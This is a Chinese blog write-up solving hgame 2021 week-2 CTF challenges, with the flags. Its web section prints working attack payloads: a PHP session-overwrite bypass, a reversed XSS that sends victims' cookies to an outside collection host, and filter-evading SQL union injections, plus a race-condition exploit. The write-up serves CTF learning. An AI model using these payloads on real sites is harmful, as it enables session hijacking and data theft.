---
title: 'hgame-week2-writeup'
date: 2021-02-06T21:35:00+08:00
draft: false
---

# Web

## LazyDogR4U

这是道代码审计题，访问：

http://d37a87870f.lazy.r4u.top/www.zip

拿到网站源码

![image-20210207005539902](https://i.loli.net/2021/02/07/jxShg6maAyLe54M.png)

可还行，可以看到用户名和密码

![image-20210207010641476](https://i.loli.net/2021/02/07/mYaENsR7W9SZn5L.png)

这个 testuser开头是 0e 可能会有机会可乘，去看一下登录相关的代码。

![image-20210207010801937](https://i.loli.net/2021/02/07/PAZtWQGTLMd2qx8.png)

果然这里用了 == 弱比较，找一个密码的 md5 值为 0e 开头的密码就行

使用 testuser    QNKCDZO 成功登录

![image-20210207011001682](https://i.loli.net/2021/02/07/dRotUvYZpz4KCH2.png)

再次查看源码

发现这个地方有机会实现变量覆盖

![image-20210208020951528](https://i.loli.net/2021/02/08/4qw1TiQfroAPBlv.png)

自己弄了个php试了一下

![image-20210208021036265](https://i.loli.net/2021/02/08/atP6Uulx1RAVWpO.png)

我们可以控制 get 成这样的值：\_POST\[\_SESSION\]\[username\] = 1

执行 foreach 时，第一次循环，此时 \$\_request 是 \_GET，然后 \$\_k 是 \_POST，所以是 ${_POST}\[\_SESSION\]\[username\] = 1;

然后执行到第二次 foreach，此时 \$\_request 为 \_POST，\$_k 就是数组的键，自然就是 \_SESSION，所以执行的就是 ${\_SESSION}['username']=1

这样就覆盖了 $\_SESSION 了

但是这里还有一个过滤操作，所以需要双写 SESSION 绕过过滤

最后的 payload 就是这样：_POST\[\_SESSISESSIONON][username] = admin

![image-20210208022332916](https://i.loli.net/2021/02/08/R9TIJEWFd5tmizg.png)



hgame{R4U\~|s-4-LazY~doG}





## Post to zuckonit 

![image-20210207102600314](https://i.loli.net/2021/02/07/vtMuxa3b7FHE9NV.png)

Blog XSS，直接一把梭。结果因为自己没有 XSS 平台倒腾了一晚上

这是计算Code的程序：

```python
import hashlib
def func(md5_val):
    for x in range(1, 100000000):
        md5_value = hashlib.md5(str(x).encode(encoding='UTF-8')).hexdigest()
        if md5_value[:6] == md5_val:
            return str(x)
print(func(input('md5_val:')))
```

根据观察，发现payload会被倒序，所以把 XSS 程序提前倒序 

这是我的payload（已做一定隐私保护处理，不能直接使用）：

```
<img src=x onerror=prompt(1);> >//";})eikooc.tnemucod(epacse+'=eikooc&'+)noitacol.tnemucod(epacse+'=lru&mXxXaL=di&noissespeek=od?php.xedni/nc.*****.***//:ptt'+'h'=crs.peek;)(egamI wen=peek{)1==''(fi;)()};))()}}'' nruter{)e(hctac}'':ferh.noitacol.renepo.wodniw?)ferh.noitacol.renepo.wodniw && renepo.wodniw( nruter{yrt{)(noitcnuf((epacse+'=renepo&'+))()}}'' nruter{)e(hctac}eikooc.tnemucod nruter{yrt{)(noitcnuf((epacse+'=eikooc&'+))()}}'' nruter{)e(hctac}ferh.noitacol.pot nruter{yrt{)(noitcnuf((epacse+'=noitacolpot&'+))()}}'' nruter{)e(hctac}ferh.noitacol.tnemucod nruter{yrt{)(noitcnuf((epacse+'=noitacol&mXxXaL=di&ipa=od?php.xedni/nc.*****.***//:ptt'+'h'=crs.))(egamI wen({)(noitcnuf("=rorreno enon:yalpsid=elyts uoyssx=di ""=crs gmi<
```

发到平台上长这样：

![image-20210207103304430](https://i.loli.net/2021/02/07/R6ZIgkbofPXGp9q.png)

查看源码：

![image-20210207103336080](https://i.loli.net/2021/02/07/WUVN1szy5eTuljp.png)

成功嵌入网页

用程序跑出 Code，Submit。

去后台看数据，成功拿到管理员的token

![image-20210207103215176](https://i.loli.net/2021/02/07/ycXW97RNba6tA3H.png)

![image-20210207103536655](https://i.loli.net/2021/02/07/7KkJtegH8Q5MCUp.png)

![image-20210207103625336](https://i.loli.net/2021/02/07/to8QgjP4OAqCEhz.png)

浏览器插件改一下 Cookies ，用 Postman之类也行。

访问http://zuckonit.0727.site:7654/flag

成功拿到flag：



hgame{X5s_t0_GEt_@dm1n's_cOokies.}



## 200OK!!

![image-20210210014236634](https://i.loli.net/2021/02/10/HaqljRESkfJcZQs.png)

分析源码，得出接口 /server.php

请求头包含 Status 且值的范围为1~15

先看下有没有注入漏洞

先用1测试正常返回

![image-20210210014508120](https://i.loli.net/2021/02/10/LXO2qUeQgM1E3kG.png)

尝试1’

![image-20210210014614502](https://i.loli.net/2021/02/10/9HJMbq6BpX74kov.png)

返回异常

尝试1 and 1 = 1

![image-20210210014740920](https://i.loli.net/2021/02/10/PWuME3wIpC1nc72.png)

尝试1 and 1 = 2

![image-20210210014813942](https://i.loli.net/2021/02/10/w2Rs5LFDUEjSiQ8.png)

返回数据无差异，判断非数字型漏洞

尝试1‘ #

![image-20210210014955691](https://i.loli.net/2021/02/10/LD17J62paog4iGc.png)

返回正确

尝试1'  and 1 = 2#

![image-20210210015028795](https://i.loli.net/2021/02/10/8ck4GFEeAMhu5Dl.png)

返回错误

据此推断为字符型注入



使用联合查询获得数据库名（50’union select database()）

因为只会返回查询结果的第一条，所以要保证第一个查询无结果，同时有简单的sql注入过滤，所以要使用双写绕过过滤

50'ununionion/\*\*/seleselectct/\*\*/database()#

![image-20210210205358636](https://i.loli.net/2021/02/10/oretHz5vxWpijFg.png)

查询表名

50'ununionion/\*\*/seleselectct/\*\*/table_name/\*\*/frfromom/\*\*/information_schema.TABLES/\*\*/wwherehere/\*\*/TABLE_SCHEMA='week2sqli'#

![image-20210210222301494](https://i.loli.net/2021/02/10/kswnxRGrhymoO5S.png)

查询字段名

50'ununionion/\*\*/seleselectct/\*\*/column_name/\*\*/frfromom/\*\*/information_schema.columns/\*\*/wwherehere/\*\*/TABLE_SCHEMA='week2sqli'/\*\*/and/\*\*/table_name='f1111111144444444444g'#

![image-20210210223806603](https://i.loli.net/2021/02/10/hUxXQLGuSt7r4kM.png)

50'ununionion/\*\*/seleselectct/\*\*/ffffff14gggggg/\*\*/frfromom/\*\*/f1111111144444444444g#

![image-20210210224719553](https://i.loli.net/2021/02/10/hEKsDUi8PyJVCbI.png)



hgame{Con9raTu1ati0n5+yoU_FXXK~Up-tH3,5Q1!!=)}



## Liki的生日礼物

![image-20210207063428457](https://i.loli.net/2021/02/07/TOHJvoF56rWGQ2l.png)

尝试弱密码登录 admin admin登录成功

![image-20210207063540543](https://i.loli.net/2021/02/07/JXW85LhDb2NZr6G.png)

看样子已经有人来兑换过券了



尝试重新注册新的账号，并且尝试”条件竞争“漏洞。

浏览器发送一个购买请求

将购买请求塞给burp，

![image-20210210023611804](https://i.loli.net/2021/02/10/Evduz7wV9oRJj4Z.png)



```
POST /API/?m=buy HTTP/1.1
Host: birthday.liki.link
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 8
Origin: https://birthday.liki.link
Connection: keep-alive
Referer: https://birthday.liki.link/shop.html
Cookie: PHPSESSID=rp6rqok0sc8kfhnavpkcc0ceos

amount=5
```



使用 Burp 的 Intruder 并发请求

![image-20210210032132146](https://i.loli.net/2021/02/10/inTGILyWcVbzrNF.png)

![image-20210210032117894](https://i.loli.net/2021/02/10/qKDIdVaUeoYCunc.png)

![image-20210210032155963](https://i.loli.net/2021/02/10/JQV89we7KtviuRk.png)

发送完成后回到商城页面查看：

![image-20210210032228938](https://i.loli.net/2021/02/10/4dIQhTZX7zRYVnv.png)

刷出55张

兑换成功

![image-20210210032256002](https://i.loli.net/2021/02/10/lGo3KAv6gTuaLOd.png)



hgame{L0ck_1s_TH3_S0lllut!on!!!}



# Crypto

## signin

拿到一个 Python 程序

![image-20210206233257115](https://i.loli.net/2021/02/06/h6c3KHftnRba7NI.png)

![CTF中RSA题型解题思路及技巧](https://i.loli.net/2021/02/07/sayBFLKf3MDWmV7.jpg)

然后同样是安装库的问题，gmpy2 库在我电脑上编译不了，可能是什么库少装了。Python 高版本解决方式：

在：https://www.lfd.uci.edu/~gohlke/pythonlibs/

下载gmpy2安装包

![image-20210207204828667](https://i.loli.net/2021/02/07/C8SPTnKFZOuYoB9.png)

选择合适的版本，下载并安装：

pip install "whl包名"



正片开始，这个模运算还没接触过，自己弄了一晚上，最后让Liki小姐姐教了好久模运算才大概弄明白

先利用费马小定理化简加密公式

c = (a ** (p-1)) % p * a * m % p

c = a * m % p

c = am(mod p)

然后得出m = c/a(mod p)

因为模运算中的除法操作是靠逆元实现的，所以c/a在模运算中应该写成c*（a的逆元）

这里利用 gmpy2 中的函数 invert(a, p) 求逆元，所以总体程序是这样

```
from libnum import *
import gmpy2
a = 173850238393608593391951896613467608950442363167911880317873686893733128994941274607560800688947088601393519171655109508141268682889576031364696334563924532285222870693181155608731996744543919961911954710012293873876853985789351830157648232302155297246394432652002588072543902780375921797530691738081541901153
p = 102835909633098694753498240881201037436863975072100915983753520961888736134133486240138127316486566543665010672988083054256371845264429502502923928519106407075441076303870999727410914693847926010540167392998414150222099689517076659052568598637825284306047789529402676432419777578427844460054391642343526112829
c = 38583965407970048974816734094721193828621419396798583216819087861341774327012239061235191710474865477938217473849459821574352235718204492051330954656667611830201009606298934365978776737362454431832513766783324771586945671639941003369937323868230648328121279499420464357217284661000942504012290582127233506041
aInvert = gmpy2.invert(a, p)
print(n2s(int(c*aInvert % p)).decode())

```

运行，得flag



hgame{M0du1@r_m4th+1s^th3~ba5is-Of=cRypt0!!}



## gcd or more?

cipher = pow(s2n(FLAG), 2, n)

百度得知 rabin 加密的操作和本题相同

查看rabin解密流程

![image-20210209203512182](https://i.loli.net/2021/02/09/zaOdjGqSkfPrhyQ.png)

写程序：

```python
from libnum import *
import gmpy2
p = 85228565021128901853314934583129083441989045225022541298550570449389839609019
q = 111614714641364911312915294479850549131835378046002423977989457843071188836271
n = p * q
Cipher = 7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539

mp = pow(Cipher, (p+1)//4, p)
mq = pow(Cipher, (q+1)//4, q)
yp = gmpy2.invert(p, q)
yq = gmpy2.invert(q, p)

a = (yp*p*mq + yq*q*mp) % n
b = n - a
c = (yp*p*mq - yq*q*mp) % n
d = n - c

print(n2s(int(a)).decode('utf-8', 'ignore'))
print(n2s(int(b)).decode('utf-8', 'ignore'))
print(n2s(int(c)).decode('utf-8', 'ignore'))
print(n2s(int(d)).decode('utf-8', 'ignore'))
```



hgame{3xgCd~i5_re4l1y+e@sy^r1ght?}



## WhitegiveRSA

RSA 直接上程序

```
from Crypto.Util.number import long_to_bytes
import libnum
c = 747831491353896780365654517748216624798517769637260742155527
n = 882564595536224140639625987659416029426239230804614613279163
e = 65537
q = 1029224947942998075080348647219
p = 857504083339712752489993810777

d = libnum.invmod(e, (p - 1) * (q - 1))
m = pow(c, d, n)   # m 的十进制形式
string = long_to_bytes(m)  # m明文
print(string)  # 结果为 b‘ m ’ 的形式
```

做这一题配环境配了好久，python3.8 装 Crypto 库死活不行

安装方式：

```
pip3 install pycryptodome 
快速方式：pip3 install -i https://pypi.douban.com/simple pycryptodome 
PyCrypto 已死,请替换为 PyCryptodome 

需要在python目录里面把Python36\Lib\site-packages下的crypto文件改名，没错，就是直接改成Crypto。结果就能用了...
```

flag：



hgame{w0w~yOU_kNoW+R5@!}



## The Password 

这题就是 xor 加强版，Python 的移位操作和 C艹 还有一些不同，导致我循环位移语句‘((x >> right) ^ (x << (63-right)))’反复翻车

后来用 Z3 库的时候也因为各种奇奇怪怪的操作翻车



不过最后还是写出了解密程序，具体就不多说了

```python
from libnum import *
from z3 import *

y = [15789597796041222200, 8279663441787235887, 9666438290109535850,
     10529571502219113153, 8020289479524135048, 10914636017953100490, 4622436850708129231]
n = [14750142427529922, 2802568775308984, 15697145971486341,
     9110411034859362, 4092084344173014, 2242282628961085, 10750832281632461]
r = [7, 4, 2, 6, 8, 5, 2]
l = [3, 9, 5, 13, 48, 7, 5]  # 左移16相当于右移64-16=48，所以l[4]=48

yn = [str(bin(y[i] ^ n[i]))[2:].zfill(64) for i in range(7)]

def solve(right, left, yXorN):
    x=[BitVec("x[%d]" % i, 1) for i in range(64)]
    s=Solver()
    for i in range(64):
        s.add(x[i] ^ x[(i+64-right) % 64] ^ x[(i+left) %
                                              64] == int(yXorN[i]))
    s.check()

    if s.check() == sat:
        m=s.model()
        result=int("".join([str(m.eval(x[i])) for i in range(64)]), 2)
        return result


for i in range(7):
    print(str(n2s(solve(r[i], l[i], yn[i])))[2:-1], end='')
```



hgame{l1ne0r_a1gebr0&is@1mpor10n1^1n$crypto}



# MISC

## Tools

拿到手一个加密的压缩包和一个俄罗斯套娃的图片

![image-20210206225953054](https://i.loli.net/2021/02/06/R9wCNK3TdJpMlLg.png)

查看文件属性

![image-20210206230111213](https://i.loli.net/2021/02/06/ah8oykdZeuncOxR.png)

!LyJJ9bi&M7E72*JyD

根据首位的感叹号特征 推测是base91编码

解码后得到：

39,164,108,224,214,24,102,72,78,67,219,196,27,67

发现不对劲，然后看了下压缩包文件名是F5

搜了一下居然存在F5隐写这种东西，我直接好家伙。

然后上github下载了一下工具，成功解码

![image-20210207033114966](https://i.loli.net/2021/02/07/xqsW8MV9lBi7Pbm.png)

![image-20210207033127348](https://i.loli.net/2021/02/07/QHCOmArRcD83FaG.png)

e@317S*p1A4bIYIs1M

成功解开压缩包

![image-20210207033248230](https://i.loli.net/2021/02/07/jd5LGauTvV7th9K.png)

。。。果然是套娃啊。这回学聪明了 直接搜索 Steghide

同样操作拿到密码

![image-20210207033614289](https://i.loli.net/2021/02/07/Brdjybuc5WiD13L.png)

直接就冲！

![image-20210207033817963](https://i.loli.net/2021/02/07/UGSam6AlEYnDBPz.png)

再冲！

![image-20210207033901937](https://i.loli.net/2021/02/07/qn7rKJAcIsjEYt2.png)

![image-20210207033919351](https://i.loli.net/2021/02/07/dmuNT3yMocVJ4Ap.png)

解压 冲！

![image-20210207034257181](https://i.loli.net/2021/02/07/c3iwKMsFuztJXG1.png)

![image-20210207034234856](https://i.loli.net/2021/02/07/jg7oqtnQ1v6u94I.png)

![image-20210207034311804](https://i.loli.net/2021/02/07/uq25DdKHESJWmig.png)

![image-20210207034328594](https://i.loli.net/2021/02/07/oWth3azEdQF4pki.png)

解压 冲！[JPHS](http://io.acad.athabascau.ca/~grizzlie/Comp607/programs.htm)？

![image-20210207034420082](https://i.loli.net/2021/02/07/p3srfWRK2hxkXVY.png)

![](https://i.loli.net/2021/02/07/fMgsaFhNp4ierS5.png)

![image-20210207035242246](https://i.loli.net/2021/02/07/P6qZYghsOJVBWUj.png)

![image-20210207035431059](https://i.loli.net/2021/02/07/XxqsWL3NIyzFOgp.png)

解压

![image-20210207035419228](https://i.loli.net/2021/02/07/qFpmzETtrhR4Cjv.png)

最后就是把获得的四个二维码缝合起来

![image-20210207040003751](https://i.loli.net/2021/02/07/5iyYL6Rv3VkK7FG.png)

懒得开 Photoshop 了，就这么缝合吧。反正都能扫描



hgame{Taowa_is_N0T_g00d_but_T001s_is_Useful}



## Telegraph：1601 6639 3459 3134 0892

这题拿到手的第一反应就是频谱能量。最早接触音频隐写是两年前回形针的解密活动

拿到手马上导入 Au，查看频谱

![image-20210206224326882](https://i.loli.net/2021/02/06/O3xWNE1cuIvjotZ.png)

可以看出来提示我们去看 850Hz，马上杀过去，看到长长短短莫斯电码

![image-20210206224510989](https://i.loli.net/2021/02/06/9wGltCugvTnsUP5.png)

-.-- --- ..- .-. ..-. .-.. .- --. .. ... ---... ....- --. ----- ----- -.. ... ----- -. --. -... ..- - -. ----- - ....- --. ----- ----- -.. -- .- -. ----- ...-- ----. ...-- .---- ----- -.- ..

可惜自己想考业余无线电的资格证一直没有去考

拿到在线转换器转换一下

YOURFLAGIS4G00DS0NGBUTN0T4G00DMAN039310KI

转成flag：



hgame{4G00DS0NGBUTN0T4G00DMAN039310KI}



## Hallucigenia

拿到的也是图片，几条路子过一遍，最后拿 Stegsolve 看一下。

马上就看出图片中藏的东西

![image-20210206231108533](https://i.loli.net/2021/02/06/ajQHTgP1hb8OAGx.png)

二维码扫描出来是这样：

gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC/KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51/KHHT/6/ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5/IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF/LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y///p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk=

末尾是=，而且字符串含有+和/，说明是base64.

解码后：

![image-20210208093549323](https://i.loli.net/2021/02/08/dRDKxhmiJlZzYM9.png)

并不是文字字符串

题目中提到：“我们不仅弄错了他的上下，还颠倒了它的左右。”

看样子还存在逆序。

发现末尾有 GNP ，是 PNG 的倒序，看样子这是把 PNG 转成 base64 存了。

写个程序存一下文件

![image-20210208094451001](https://i.loli.net/2021/02/08/SJqFC34RKhyB1dn.png)

翻正就拿到了flag



hgame{tenchi_souzou_dezain_bu}



## DNS

这题主要考 DNS 相关的知识，拿到的是 Wireshark 抓到的包，其中有 DNS 请求，看了下是查询 flag.hgame2021.cf

![image-20210206223708328](https://i.loli.net/2021/02/06/Zw8q4uscLYvbnOD.png)

再往下是 HTTP 请求，看了下网页内容

![image-20210206223814099](https://i.loli.net/2021/02/06/SlRnWJ4gptyfFh1.png)

![image-20210206223755663](https://i.loli.net/2021/02/06/xu2Y3BbzFvAePDV.png)

实际上这一题不用看这个也能想到和TXT记录有关。

然后打开 CMD ，输入 nslookup -q=txt flag.hgame2021.cf

![image-20210206223919838](https://i.loli.net/2021/02/06/1fRpiOeDTAqdY9r.png)



hgame{D0main_N4me_5ystem}

